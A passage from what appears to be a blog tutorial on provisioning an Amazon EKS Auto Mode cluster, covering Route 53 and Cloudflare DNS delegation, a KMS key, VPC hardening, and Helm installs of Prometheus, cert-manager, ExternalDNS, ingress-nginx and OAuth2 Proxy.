AWS_ACCOUNT_ID mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Confirm that all essential variables have been properly configured: : \"${AWS_ACCESS_KEY_ID?}\" : \"${AWS_DEFAULT_REGION?}\" : \"${AWS_SECRET_ACCESS_KEY?}\" : \"${AWS_ROLE_TO_ASSUME?}\" : \"${GOOGLE_CLIENT_ID?}\" : \"${GOOGLE_CLIENT_SECRET?}\" echo -e \"${MY_EMAIL} | ${CLUSTER_NAME} | ${BASE_DOMAIN} | ${CLUSTER_FQDN}\\n${TAGS}\" Install the required tools: You can bypass these procedures if you already have all the essential software installed. AWS CLI eksctl kubectl helm Configure AWS Route 53 Domain delegation The DNS delegation tasks should be executed as a one-time operation. Create a DNS zone for the EKS clusters: export CLOUDFLARE_EMAIL=\"petr.ruzicka@gmail.com\" export CLOUDFLARE_API_KEY=\"1xxxxxxxxx0\" aws route53 create-hosted-zone --output json \\ --name \"${BASE_DOMAIN}\" \\ --caller-reference \"$(date)\" \\ --hosted-zone-config=\"{\\\"Comment\\\": \\\"Created by petr.ruzicka@gmail.com\\\", \\\"PrivateZone\\\": false}\" | jq Route53 k8s.mylabs.dev zone Utilize your domain registrar to update the nameservers for your zone (e.g., mylabs.dev) to point to Amazon Route 53 nameservers. Here’s how to discover the required Route 53 nameservers: NEW_ZONE_ID=$(aws route53 list-hosted-zones --query \"HostedZones[?Name==\\`${BASE_DOMAIN}.\\`].Id\" --output text) NEW_ZONE_NS=$(aws route53 get-hosted-zone --output json --id \"${NEW_ZONE_ID}\" --query \"DelegationSet.NameServers\") NEW_ZONE_NS1=$(echo \"${NEW_ZONE_NS}\" | jq -r \".[0]\") NEW_ZONE_NS2=$(echo \"${NEW_ZONE_NS}\" | jq -r \".[1]\") Establish the NS record in k8s.mylabs.dev (your BASE_DOMAIN) for proper zone delegation. This operation’s specifics may vary based on your domain registrar; I use Cloudflare and employ Ansible for automation: ansible -m cloudflare_dns -c local -i \"localhost,\" localhost -a \"zone=mylabs.dev record=${BASE_DOMAIN} type=NS value=${NEW_ZONE_NS1} solo=true proxied=no account_email=${CLOUDFLARE_EMAIL} account_api_token=${CLOUDFLARE_API_KEY}\" ansible -m cloudflare_dns -c local -i \"localhost,\" localhost -a \"zone=mylabs.dev record=${BASE_DOMAIN} type=NS value=${NEW_ZONE_NS2} solo=false proxied=no account_email=${CLOUDFLARE_EMAIL} account_api_token=${CLOUDFLARE_API_KEY}\" localhost | CHANGED =&gt; { \"ansible_facts\": { \"discovered_interpreter_python\": \"/usr/bin/python\" }, \"changed\": true, \"result\": { \"record\": { \"content\": \"ns-885.awsdns-46.net\", \"created_on\": \"2020-11-13T06:25:32.18642Z\", \"id\": \"dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb\", \"locked\": false, \"meta\": { \"auto_added\": false, \"managed_by_apps\": false, \"managed_by_argo_tunnel\": false, \"source\": \"primary\" }, \"modified_on\": \"2020-11-13T06:25:32.18642Z\", \"name\": \"k8s.mylabs.dev\", \"proxiable\": false, \"proxied\": false, \"ttl\": 1, \"type\": \"NS\", \"zone_id\": \"2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe\", \"zone_name\": \"mylabs.dev\" } } } localhost | CHANGED =&gt; { \"ansible_facts\": { \"discovered_interpreter_python\": \"/usr/bin/python\" }, \"changed\": true, \"result\": { \"record\": { \"content\": \"ns-1692.awsdns-19.co.uk\", \"created_on\": \"2020-11-13T06:25:37.605605Z\", \"id\": \"9xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb\", \"locked\": false, \"meta\": { \"auto_added\": false, \"managed_by_apps\": false, \"managed_by_argo_tunnel\": false, \"source\": \"primary\" }, \"modified_on\": \"2020-11-13T06:25:37.605605Z\", \"name\": \"k8s.mylabs.dev\", \"proxiable\": false, \"proxied\": false, \"ttl\": 1, \"type\": \"NS\", \"zone_id\": \"2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe\", \"zone_name\": \"mylabs.dev\" } } } CloudFlare mylabs.dev zone Create the service-linked role Creating the service-linked role for Spot Instances is a one-time operation. Create the AWSServiceRoleForEC2Spot role to use Spot Instances in the Amazon EKS cluster: aws iam create-service-linked-role --aws-service-name spot.amazonaws.com Details: Work with Spot Instances Create Route53 zone and KMS key infrastructure Generate a CloudFormation template that defines an Amazon Route 53 zone and an AWS Key Management Service (KMS) key. Add the new domain CLUSTER_FQDN to Route 53, and set up DNS delegation from the BASE_DOMAIN. tee \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms.yml\" &lt;&lt; \\EOF AWSTemplateFormatVersion: 2010-09-09 Description: Route53 entries and KMS key Parameters: BaseDomain: Description: \"Base domain where cluster domains + their subdomains will live - Ex: k8s.mylabs.dev\" Type: String ClusterFQDN: Description: \"Cluster FQDN (domain for all applications) - Ex: k01.k8s.mylabs.dev\" Type: String ClusterName: Description: \"Cluster Name - Ex: k01\" Type: String Resources: HostedZone: Type: AWS::Route53::HostedZone Properties: Name: !Ref ClusterFQDN RecordSet: Type: AWS::Route53::RecordSet Properties: HostedZoneName: !Sub \"${BaseDomain}.\" Name: !Ref ClusterFQDN Type: NS TTL: 60 ResourceRecords: !GetAtt HostedZone.NameServers KMSAlias: Type: AWS::KMS::Alias Properties: AliasName: !Sub \"alias/eks-${ClusterName}\" TargetKeyId: !Ref KMSKey KMSKey: Type: AWS::KMS::Key Properties: Description: !Sub \"KMS key for ${ClusterName} Amazon EKS\" EnableKeyRotation: true PendingWindowInDays: 7 KeyPolicy: Version: \"2012-10-17\" Id: !Sub \"eks-key-policy-${ClusterName}\" Statement: - Sid: Allow direct access to key metadata to the account Effect: Allow Principal: AWS: - !Sub \"arn:${AWS::Partition}:iam::${AWS::AccountId}:root\" Action: - kms:* Resource: \"*\" - Sid: Allow access through EBS for all principals in the account that are authorized to use EBS Effect: Allow Principal: AWS: \"*\" Action: - kms:Encrypt - kms:Decrypt - kms:ReEncrypt* - kms:GenerateDataKey* - kms:CreateGrant - kms:DescribeKey Resource: \"*\" Condition: StringEquals: kms:ViaService: !Sub \"ec2.${AWS::Region}.amazonaws.com\" kms:CallerAccount: !Sub \"${AWS::AccountId}\" Outputs: KMSKeyArn: Description: The ARN of the created KMS Key to encrypt EKS related services Value: !GetAtt KMSKey.Arn Export: Name: Fn::Sub: \"${AWS::StackName}-KMSKeyArn\" KMSKeyId: Description: The ID of the created KMS Key to encrypt EKS related services Value: !Ref KMSKey Export: Name: Fn::Sub: \"${AWS::StackName}-KMSKeyId\" EOF # shellcheck disable=SC2001 eval aws cloudformation deploy --capabilities CAPABILITY_NAMED_IAM \\ --parameter-overrides \"BaseDomain=${BASE_DOMAIN} ClusterFQDN=${CLUSTER_FQDN} ClusterName=${CLUSTER_NAME}\" \\ --stack-name \"${CLUSTER_NAME}-route53-kms\" --template-file \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms.yml\" --tags \"${TAGS//,/ }\" AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${CLUSTER_NAME}-route53-kms\" --query \"Stacks[0].Outputs[? OutputKey==\\`KMSKeyArn\\` || OutputKey==\\`KMSKeyId\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_KMS_KEY_ARN=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KMSKeyArn\\\") .OutputValue\") AWS_KMS_KEY_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KMSKeyId\\\") .OutputValue\") After running the CloudFormation stack, you should see the following Route53 zones: Route53 k01.k8s.mylabs.dev zone Route53 k8s.mylabs.dev zone You should also see the following KMS key: KMS key Create Amazon EKS Auto Mode I will use eksctl to create the Amazon EKS Auto Mode cluster. tee \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}.yml\" &lt;&lt; EOF apiVersion: eksctl.io/v1alpha5 kind: ClusterConfig metadata: name: ${CLUSTER_NAME} region: ${AWS_DEFAULT_REGION} tags: $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") availabilityZones: - ${AWS_DEFAULT_REGION}a - ${AWS_DEFAULT_REGION}b accessConfig: accessEntries: - principalARN: arn:${AWS_PARTITION}:iam::${AWS_ACCOUNT_ID}:role/admin accessPolicies: - policyARN: arn:${AWS_PARTITION}:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy accessScope: type: cluster iam: podIdentityAssociations: - namespace: cert-manager serviceAccountName: cert-manager roleName: eksctl-${CLUSTER_NAME}-pia-cert-manager wellKnownPolicies: certManager: true - namespace: external-dns serviceAccountName: external-dns roleName: eksctl-${CLUSTER_NAME}-pia-external-dns wellKnownPolicies: externalDNS: true addons: - name: eks-pod-identity-agent autoModeConfig: enabled: true nodePools: [\"system\"] secretsEncryption: keyARN: ${AWS_KMS_KEY_ARN} cloudWatch: clusterLogging: logRetentionInDays: 1 enableTypes: - all EOF eksctl create cluster --config-file \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}.yml\" --kubeconfig \"${KUBECONFIG}\" || eksctl utils write-kubeconfig --cluster=\"${CLUSTER_NAME}\" --kubeconfig \"${KUBECONFIG}\" Enhance the security posture of the EKS cluster by addressing the following concerns: AWS_VPC_ID=$(aws ec2 describe-vpcs --filters \"Name=tag:alpha.eksctl.io/cluster-name,Values=${CLUSTER_NAME}\" --query 'Vpcs[*].VpcId' --output text) AWS_SECURITY_GROUP_ID=$(aws ec2 describe-security-groups --filters \"Name=vpc-id,Values=${AWS_VPC_ID}\" \"Name=group-name,Values=default\" --query 'SecurityGroups[*].GroupId' --output text) AWS_NACL_ID=$(aws ec2 describe-network-acls --filters \"Name=vpc-id,Values=${AWS_VPC_ID}\" --query 'NetworkAcls[*].NetworkAclId' --output text) The default security group should have no rules configured: aws ec2 revoke-security-group-egress --group-id \"${AWS_SECURITY_GROUP_ID}\" --protocol all --port all --cidr 0.0.0.0/0 | jq || true aws ec2 revoke-security-group-ingress --group-id \"${AWS_SECURITY_GROUP_ID}\" --protocol all --port all --source-group \"${AWS_SECURITY_GROUP_ID}\" | jq || true The VPC NACL allows unrestricted SSH access, and the VPC NACL allows unrestricted RDP access: aws ec2 create-network-acl-entry --network-acl-id \"${AWS_NACL_ID}\" --ingress --rule-number 1 --protocol tcp --port-range \"From=22,To=22\" --cidr-block 0.0.0.0/0 --rule-action Deny aws ec2 create-network-acl-entry --network-acl-id \"${AWS_NACL_ID}\" --ingress --rule-number 2 --protocol tcp --port-range \"From=3389,To=3389\" --cidr-block 0.0.0.0/0 --rule-action Deny The VPC should have Route 53 DNS resolver with logging enabled: AWS_CLUSTER_LOG_GROUP_ARN=$(aws logs describe-log-groups --query \"logGroups[?logGroupName=='/aws/eks/${CLUSTER_NAME}/cluster'].arn\" --output text) AWS_CLUSTER_ROUTE53_RESOLVER_QUERY_LOG_CONFIG_ID=$(aws route53resolver create-resolver-query-log-config \\ --name \"${CLUSTER_NAME}-vpc-dns-logs\" \\ --destination-arn \"${AWS_CLUSTER_LOG_GROUP_ARN}\" \\ --creator-request-id \"$(uuidgen)\" --query 'ResolverQueryLogConfig.Id' --output text) aws route53resolver associate-resolver-query-log-config \\ --resolver-query-log-config-id \"${AWS_CLUSTER_ROUTE53_RESOLVER_QUERY_LOG_CONFIG_ID}\" \\ --resource-id \"${AWS_VPC_ID}\" I was not able to get NetworkPolicy working correctly with kube-prometheus-stack in EKS Auto Mode. Prometheus was encountering a dial tcp 10.100.0.1:443: i/o timeout error and could not retrieve metric data. Therefore, I will keep NetworkPolicy turned off for this setup. Create a Node Class for Amazon EKS. This defines infrastructure-level settings that apply to groups of nodes in your EKS cluster, including network configuration, storage settings, and resource tagging: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-eks-nodeclass.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: eks.amazonaws.com/v1 kind: NodeClass metadata: name: my-default spec: $(kubectl get nodeclasses default -o yaml | yq '.spec | pick([\"role\", \"securityGroupSelectorTerms\", \"subnetSelectorTerms\"])' | sed 's/\\(.*\\)/ \\1/') ephemeralStorage: size: 20Gi # https://github.com/eksctl-io/eksctl/issues/8136 # tags: # Name: ${CLUSTER_NAME} EOF Create a Node Pool for EKS Auto Mode. This defines specific requirements for your compute resources, including instance types, availability zones, architectures, and capacity types: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-karpenter-nodepool.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: karpenter.sh/v1 kind: NodePool metadata: name: my-default spec: template: spec: nodeClassRef: group: eks.amazonaws.com kind: NodeClass name: my-default requirements: - key: eks.amazonaws.com/instance-category operator: In values: [\"t\"] - key: karpenter.sh/capacity-type operator: In values: [\"spot\", \"on-demand\"] - key: topology.kubernetes.io/zone operator: In values: [\"${AWS_DEFAULT_REGION}a\"] - key: kubernetes.io/arch operator: In values: [\"arm64\"] - key: kubernetes.io/os operator: In values: [\"linux\"] limits: cpu: 8 memory: 32Gi EOF Create a new StorageClass based on the EBS CSI driver: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-storage-storageclass.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: storage.k8s.io/v1 kind: StorageClass metadata: annotations: storageclass.kubernetes.io/is-default-class: \"true\" name: gp3 provisioner: ebs.csi.eks.amazonaws.com # https://github.com/kubernetes-sigs/aws-ebs-csi-driver/blob/master/docs/parameters.md parameters: kmsKeyId: ${AWS_KMS_KEY_ID} reclaimPolicy: Delete volumeBindingMode: WaitForFirstConsumer allowVolumeExpansion: true EOF Mailpit Mailpit will be used to receive email alerts from Prometheus. Install the mailpit Helm chart and modify its default values: # renovate: datasource=helm depName=mailpit registryUrl=https://jouve.github.io/charts/ MAILPIT_HELM_CHART_VERSION=\"0.21.0\" helm repo add --force-update jouve https://jouve.github.io/charts/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mailpit.yml\" &lt;&lt; EOF ingress: enabled: true ingressClassName: nginx annotations: gethomepage.dev/enabled: \"true\" gethomepage.dev/description: An email and SMTP testing tool with API for developers gethomepage.dev/group: Apps gethomepage.dev/icon: https://raw.githubusercontent.com/axllent/mailpit/61241f11ac94eb33bd84e399129992250eff56ce/server/ui/favicon.svg gethomepage.dev/name: Mailpit nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri hostname: mailpit.${CLUSTER_FQDN} EOF helm upgrade --install --version \"${MAILPIT_HELM_CHART_VERSION}\" --namespace mailpit --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mailpit.yml\" mailpit jouve/mailpit Screenshot: kube-prometheus-stack Prometheus should be one of the initial applications installed on the Kubernetes cluster because numerous Kubernetes services and applications can export metrics to it. The kube-prometheus-stack is a collection of Kubernetes manifests, Grafana dashboards, and Prometheus rules. It’s combined with documentation and scripts to provide easy-to-operate, end-to-end Kubernetes cluster monitoring with Prometheus using the Prometheus Operator. Install the kube-prometheus-stack Helm chart and modify its default values: # renovate: datasource=helm depName=kube-prometheus-stack registryUrl=https://prometheus-community.github.io/helm-charts KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION=\"67.9.0\" helm repo add --force-update prometheus-community https://prometheus-community.github.io/helm-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack.yml\" &lt;&lt; EOF defaultRules: rules: etcd: false kubernetesSystem: false kubeScheduler: false # https://github.com/prometheus-community/helm-charts/blob/main/charts/alertmanager/values.yaml alertmanager: config: global: smtp_smarthost: \"mailpit-smtp.mailpit.svc.cluster.local:25\" smtp_from: \"alertmanager@${CLUSTER_FQDN}\" route: group_by: [\"alertname\", \"job\"] receiver: email routes: - receiver: email matchers: - severity =~ \"warning|critical\" receivers: - name: email email_configs: - to: \"notification@${CLUSTER_FQDN}\" require_tls: false ingress: enabled: true ingressClassName: nginx annotations: gethomepage.dev/enabled: \"true\" gethomepage.dev/description: Alert Routing System gethomepage.dev/group: Observability gethomepage.dev/icon: alertmanager.svg gethomepage.dev/name: Alert Manager gethomepage.dev/app: alertmanager gethomepage.dev/pod-selector: \"app.kubernetes.io/name=alertmanager\" nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri hosts: - alertmanager.${CLUSTER_FQDN} paths: [\"/\"] pathType: ImplementationSpecific tls: - hosts: - alertmanager.${CLUSTER_FQDN} # https://github.com/grafana/helm-charts/blob/main/charts/grafana/values.yaml grafana: defaultDashboardsEnabled: false ingress: enabled: true ingressClassName: nginx annotations: gethomepage.dev/description: Visualization Platform gethomepage.dev/enabled: \"true\" gethomepage.dev/group: Observability gethomepage.dev/icon: grafana.svg gethomepage.dev/name: Grafana gethomepage.dev/app: grafana gethomepage.dev/pod-selector: \"app.kubernetes.io/name=grafana\" nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri nginx.ingress.kubernetes.io/configuration-snippet: | auth_request_set \\$email \\$upstream_http_x_auth_request_email; proxy_set_header X-Email \\$email; hosts: - grafana.${CLUSTER_FQDN} paths: [\"/\"] pathType: ImplementationSpecific tls: - hosts: - grafana.${CLUSTER_FQDN} sidecar: datasources: url: http://kube-prometheus-stack-prometheus.kube-prometheus-stack:9090 dashboardProviders: dashboardproviders.yaml: apiVersion: 1 providers: - name: \"default\" orgId: 1 folder: \"\" type: file disableDeletion: false editable: true options: path: /var/lib/grafana/dashboards/default dashboards: default: # keep-sorted start numeric=yes 1860-node-exporter-full: # renovate: depName=\"Node Exporter Full\" gnetId: 1860 revision: 37 datasource: Prometheus 3662-prometheus-2-0-overview: # renovate: depName=\"Prometheus 2.0 Overview\" gnetId: 3662 revision: 2 datasource: Prometheus 9614-nginx-ingress-controller: # renovate: depName=\"NGINX Ingress controller\" gnetId: 9614 revision: 1 datasource: Prometheus 12006-kubernetes-apiserver: # renovate: depName=\"Kubernetes apiserver\" gnetId: 12006 revision: 1 datasource: Prometheus # https://github.com/DevOps-Nirvana/Grafana-Dashboards 14314-kubernetes-nginx-ingress-controller-nextgen-devops-nirvana: # renovate: depName=\"Kubernetes Nginx Ingress Prometheus NextGen\" gnetId: 14314 revision: 2 datasource: Prometheus 15038-external-dns: # renovate: depName=\"External-dns\" gnetId: 15038 revision: 3 datasource: Prometheus 15757-kubernetes-views-global: # renovate: depName=\"Kubernetes / Views / Global\" gnetId: 15757 revision: 42 datasource: Prometheus 15758-kubernetes-views-namespaces: # renovate: depName=\"Kubernetes / Views / Namespaces\" gnetId: 15758 revision: 41 datasource: Prometheus # https://grafana.com/orgs/imrtfm/dashboards - https://github.com/dotdc/grafana-dashboards-kubernetes 15760-kubernetes-views-pods: # renovate: depName=\"Kubernetes / Views / Pods\" gnetId: 15760 revision: 34 datasource: Prometheus 15761-kubernetes-system-api-server: # renovate: depName=\"Kubernetes / System / API Server\" gnetId: 15761 revision: 18 datasource: Prometheus 19105-prometheus: # renovate: depName=\"Prometheus\" gnetId: 19105 revision: 6 datasource: Prometheus 19268-prometheus: # renovate: depName=\"Prometheus All Metrics\" gnetId: 19268 revision: 1 datasource: Prometheus 20340-cert-manager: # renovate: depName=\"cert-manager\" gnetId: 20340 revision: 1 datasource: Prometheus 20842-cert-manager-kubernetes: # renovate: depName=\"Cert-manager-Kubernetes\" gnetId: 20842 revision: 1 datasource: Prometheus # keep-sorted end grafana.ini: analytics: check_for_updates: false auth.basic: enabled: false auth.proxy: enabled: true header_name: X-Email header_property: email users: auto_assign_org_role: Admin smtp: enabled: true host: mailpit-smtp.mailpit.svc.cluster.local:25 from_address: grafana@${CLUSTER_FQDN} # EKS this is not available https://github.com/aws/containers-roadmap/issues/1298 kubeControllerManager: enabled: false kubeEtcd: enabled: false # EKS this is not available https://github.com/aws/containers-roadmap/issues/1298 kubeScheduler: enabled: false # in EKS the kube-proxy metrics are not available https://github.com/aws/containers-roadmap/issues/657 kubeProxy: enabled: false kube-state-metrics: selfMonitor: enabled: true # https://github.com/prometheus-community/helm-charts/issues/3613 prometheus-node-exporter: prometheus: monitor: attachMetadata: node: true relabelings: - sourceLabels: - __meta_kubernetes_endpoint_node_name targetLabel: node action: replace regex: (.+) replacement: \\${1} prometheus: ingress: enabled: true ingressClassName: nginx annotations: gethomepage.dev/enabled: \"true\" gethomepage.dev/description: Monitoring System and TSDB gethomepage.dev/group: Observability gethomepage.dev/icon: prometheus.svg gethomepage.dev/name: Prometheus gethomepage.dev/app: prometheus gethomepage.dev/pod-selector: \"app.kubernetes.io/name=prometheus\" nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri paths: [\"/\"] pathType: ImplementationSpecific hosts: - prometheus.${CLUSTER_FQDN} tls: - hosts: - prometheus.${CLUSTER_FQDN} prometheusSpec: externalLabels: cluster: ${CLUSTER_FQDN} externalUrl: https://prometheus.${CLUSTER_FQDN} ruleSelectorNilUsesHelmValues: false serviceMonitorSelectorNilUsesHelmValues: false podMonitorSelectorNilUsesHelmValues: false probeSelectorNilUsesHelmValues: false retentionSize: 1GB storageSpec: volumeClaimTemplate: spec: storageClassName: gp3 accessModes: [\"ReadWriteOnce\"] resources: requests: storage: 2Gi EOF helm upgrade --install --version \"${KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION}\" --namespace kube-prometheus-stack --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack.yml\" kube-prometheus-stack prometheus-community/kube-prometheus-stack cert-manager cert-manager adds certificates and certificate issuers as resource types in Kubernetes clusters and simplifies the process of obtaining, renewing, and using those certificates. The cert-manager ServiceAccount was created by eksctl. Install the cert-manager Helm chart and modify its default values: # renovate: datasource=helm depName=cert-manager registryUrl=https://charts.jetstack.io CERT_MANAGER_HELM_CHART_VERSION=\"1.16.3\" helm repo add --force-update jetstack https://charts.jetstack.io tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cert-manager.yml\" &lt;&lt; EOF crds: enabled: true serviceAccount: name: cert-manager enableCertificateOwnerRef: true prometheus: servicemonitor: enabled: true EOF helm upgrade --install --version \"${CERT_MANAGER_HELM_CHART_VERSION}\" --namespace cert-manager --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cert-manager.yml\" cert-manager jetstack/cert-manager Add ClusterIssuers for the Let’s Encrypt staging environment (certificates created using “staging” will not be publicly valid): tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-clusterissuer-staging.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: ClusterIssuer metadata: name: letsencrypt-staging-dns namespace: cert-manager labels: letsencrypt: staging spec: acme: server: https://acme-staging-v02.api.letsencrypt.org/directory email: ${MY_EMAIL} privateKeySecretRef: name: letsencrypt-staging-dns solvers: - selector: dnsZones: - ${CLUSTER_FQDN} dns01: route53: {} EOF kubectl wait --namespace cert-manager --timeout=15m --for=condition=Ready clusterissuer --all kubectl label secret --namespace cert-manager letsencrypt-staging-dns letsencrypt=staging Create the certificate: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-certificate-staging.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: Certificate metadata: name: ingress-cert-staging namespace: cert-manager labels: letsencrypt: staging spec: secretName: ingress-cert-staging secretTemplate: labels: letsencrypt: staging issuerRef: name: letsencrypt-staging-dns kind: ClusterIssuer commonName: \"*.${CLUSTER_FQDN}\" dnsNames: - \"*.${CLUSTER_FQDN}\" - \"${CLUSTER_FQDN}\" EOF ExternalDNS ExternalDNS synchronizes exposed Kubernetes Services and Ingresses with DNS providers. ExternalDNS will manage the DNS records. The external-dns ServiceAccount was created by eksctl. Install the external-dns Helm chart and modify its default values: # renovate: datasource=helm depName=external-dns registryUrl=https://kubernetes-sigs.github.io/external-dns/ EXTERNAL_DNS_HELM_CHART_VERSION=\"1.15.1\" helm repo add --force-update external-dns https://kubernetes-sigs.github.io/external-dns/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-external-dns.yml\" &lt;&lt; EOF serviceAccount: name: external-dns serviceMonitor: enabled: true interval: 20s policy: sync domainFilters: - ${CLUSTER_FQDN} EOF helm upgrade --install --version \"${EXTERNAL_DNS_HELM_CHART_VERSION}\" --namespace external-dns --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-external-dns.yml\" external-dns external-dns/external-dns Ingress NGINX Controller ingress-nginx is an Ingress controller for Kubernetes that uses nginx as a reverse proxy and load balancer. Install the ingress-nginx Helm chart and modify its default values: # renovate: datasource=helm depName=ingress-nginx registryUrl=https://kubernetes.github.io/ingress-nginx INGRESS_NGINX_HELM_CHART_VERSION=\"4.12.3\" kubectl wait --namespace cert-manager --for=condition=Ready --timeout=15m certificate ingress-cert-staging helm repo add --force-update ingress-nginx https://kubernetes.github.io/ingress-nginx tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx.yml\" &lt;&lt; EOF controller: config: annotations-risk-level: Critical use-proxy-protocol: true allowSnippetAnnotations: true ingressClassResource: default: true extraArgs: default-ssl-certificate: \"cert-manager/ingress-cert-staging\" service: annotations: # https://www.qovery.com/blog/our-migration-from-kubernetes-built-in-nlb-to-alb-controller/ # https://www.youtube.com/watch?v=xwiRjimKW9c service.beta.kubernetes.io/aws-load-balancer-additional-resource-tags: ${TAGS//\\'/} service.beta.kubernetes.io/aws-load-balancer-name: eks-${CLUSTER_NAME} service.beta.kubernetes.io/aws-load-balancer-nlb-target-type: ip service.beta.kubernetes.io/aws-load-balancer-scheme: internet-facing service.beta.kubernetes.io/aws-load-balancer-target-group-attributes: proxy_protocol_v2.enabled=true service.beta.kubernetes.io/aws-load-balancer-type: external loadBalancerClass: eks.amazonaws.com/nlb metrics: enabled: true serviceMonitor: enabled: true prometheusRule: enabled: true rules: - alert: NGINXConfigFailed expr: count(nginx_ingress_controller_config_last_reload_successful == 0) &gt; 0 for: 1s labels: severity: critical annotations: description: bad ingress config - nginx config test failed summary: uninstall the latest ingress changes to allow config reloads to resume - alert: NGINXCertificateExpiry expr: (avg(nginx_ingress_controller_ssl_expire_time_seconds{host!=\"_\"}) by (host) - time()) &lt; 604800 for: 1s labels: severity: critical annotations: description: ssl certificate(s) will expire in less then a week summary: renew expiring certificates to avoid downtime - alert: NGINXTooMany500s expr: 100 * ( sum( nginx_ingress_controller_requests{status=~\"5.+\"} ) / sum(nginx_ingress_controller_requests) ) &gt; 5 for: 1m labels: severity: warning annotations: description: Too many 5XXs summary: More than 5% of all requests returned 5XX, this requires your attention - alert: NGINXTooMany400s expr: 100 * ( sum( nginx_ingress_controller_requests{status=~\"4.+\"} ) / sum(nginx_ingress_controller_requests) ) &gt; 5 for: 1m labels: severity: warning annotations: description: Too many 4XXs summary: More than 5% of all requests returned 4XX, this requires your attention EOF helm upgrade --install --version \"${INGRESS_NGINX_HELM_CHART_VERSION}\" --namespace ingress-nginx --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx.yml\" ingress-nginx ingress-nginx/ingress-nginx OAuth2 Proxy Use OAuth2 Proxy to protect application endpoints with Google Authentication. Install the oauth2-proxy Helm chart and modify its default values: # renovate: datasource=helm depName=oauth2-proxy registryUrl=https://oauth2-proxy.github.io/manifests OAUTH2_PROXY_HELM_CHART_VERSION=\"7.9.2\" set +x COOKIE_SECRET=\"$(openssl rand -base64 32 | head -c 32 | base64)\" echo \"::add-mask::${COOKIE_SECRET}\" set -x helm repo add --force-update oauth2-proxy https://oauth2-proxy.github.io/manifests tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-oauth2-proxy.yml\" &lt;&lt; EOF config: clientID: ${GOOGLE_CLIENT_ID} clientSecret: ${GOOGLE_CLIENT_SECRET} cookieSecret: ${COOKIE_SECRET} configFile: |- cookie_domains = \".${CLUSTER_FQDN}\" set_authorization_header = \"true\" set_xauthrequest = \"true\" upstreams = [ \"file:///dev/null\" ] whitelist_domains = \".${CLUSTER_FQDN}\" authenticatedEmailsFile: enabled: true restricted_access: |- ${MY_EMAIL} ingress: enabled: true ingressClassName: nginx annotations: gethomepage.dev/enabled: \"true\" gethomepage.dev/description: A reverse proxy that provides authentication with Google, Azure, OpenID Connect and many more identity providers gethomepage.dev/group: Cluster Management gethomepage.dev/icon: https://raw.githubusercontent.com/oauth2-proxy/oauth2-proxy/899c743afc71e695964165deb11f50b9a0703c97/docs/static/img/logos/OAuth2_Proxy_icon.svg gethomepage.dev/name: OAuth2-Proxy hosts: - oauth2-proxy.${CLUSTER_FQDN} tls: - hosts: - oauth2-proxy.${CLUSTER_FQDN} metrics: servicemonitor: enabled: true EOF helm upgrade --install --version \"${OAUTH2_PROXY_HELM_CHART_VERSION}\" --namespace oauth2-proxy --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-oauth2-proxy.yml\" oauth2-proxy 